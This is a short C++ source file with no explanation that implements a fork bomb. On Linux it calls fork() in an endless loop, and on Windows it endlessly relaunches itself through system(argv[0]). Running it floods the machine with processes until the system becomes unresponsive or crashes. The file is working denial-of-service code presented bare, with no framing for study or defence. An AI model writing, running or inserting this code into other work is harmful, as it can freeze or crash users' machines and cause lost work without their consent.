//v1.0

#include <iostream>

#ifdef linux
	#include <unistd.h>
#elif defined(_WIN32) || defined(_WIN64)
	#include <stdlib.h>
#endif

int main(int argc, char **argv)
{
	#ifdef linux
		while(1)
			fork();
	#elif defined(_WIN32) || defined(_WIN64)
		while(1)
			system(argv[0]);
	#endif
	
	return 0;
}
